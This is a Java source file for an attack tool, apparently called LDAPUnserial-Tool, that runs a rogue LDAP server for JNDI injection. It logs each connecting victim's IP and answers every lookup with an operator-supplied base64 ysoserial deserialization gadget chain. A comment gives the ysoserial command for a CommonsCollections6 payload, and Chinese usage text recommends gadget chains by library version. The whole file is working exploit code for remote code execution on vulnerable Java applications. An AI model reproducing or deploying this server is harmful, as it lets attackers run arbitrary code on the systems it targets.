package org.ha1yu;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.SocketAddress;
import java.text.ParseException;

public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void lanuchLDAPServer(Integer ldap_port, String gadget) throws Exception {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldap_port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(gadget));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + ldap_port);
            ds.startListening();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private String gadget;

        public OperationInterceptor(String gadget) {
            this.gadget = gadget;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, e);
            } catch (Exception e1) {
                e1.printStackTrace();
            }

        }

        protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws Exception {
            //------------获取client ip-----------
            Class<?> aClass = Class.forName("com.unboundid.ldap.listener.interceptor.InterceptedOperation");
            Method getClientConnection = aClass.getDeclaredMethod("getClientConnection");
            getClientConnection.setAccessible(true);
            Object invoke = getClientConnection.invoke(result);

            Class<?> aClass2 = Class.forName("com.unboundid.ldap.listener.LDAPListenerClientConnection");
            Field socket = aClass2.getDeclaredField("socket");
            socket.setAccessible(true);
            Socket socket1 = (Socket) socket.get(invoke);

            SocketAddress remoteSocketAddress = socket1.getRemoteSocketAddress();
            //---------------------------------------

            System.out.println("收到ip: " + remoteSocketAddress.toString().substring(1) + " 的请求！");
            e.addAttribute("javaClassName", "foo");

            try {
                // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
                e.addAttribute("javaSerializedData", Base64.decode(gadget));
            } catch (ParseException e1) {
                e1.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }

    public static void main1(String[] args) throws Exception {
        System.out.println("java -cp LDAPUnserial-Tool.jar LDAPRefServer LDAP端口 base64编码后的链");
        System.out.println("客户端请求：ldap://ip:port/Exploit");
        System.out.println("CommonsCollections版本为3.x: 建议使用CC6");
        System.out.println("CommonsCollections版本为4.x: 建议使用CC2、CC4");
        System.out.println("------------------------------------------------------------------------");
//        int ldap_port = Integer.valueOf(args[0]);
//        String gadget = args[1];
        int ldap_port = 1389;
        String gadget = "";

        lanuchLDAPServer(ldap_port, gadget);
    }

    public static void main(String[] args) throws Exception {
        System.out.println("java -jar LDAPUnserial-Tool.jar LDAP端口 'base64编码后的链'");
        System.out.println("客户端请求：ldap://127.0.0.1:1389/Exploit");
        System.out.println("CommonsCollections版本为3.x: 建议使用CC6");
        System.out.println("CommonsCollections版本为4.x: 建议使用CC2、CC4");
        System.out.println("------------------------------------------------------------------------");
        int ldap_port = Integer.valueOf(args[0]);
        String gadget = args[1];
//        int ldap_port = 1389;
//        String gadget = "";

        lanuchLDAPServer(ldap_port, gadget);
    }
}
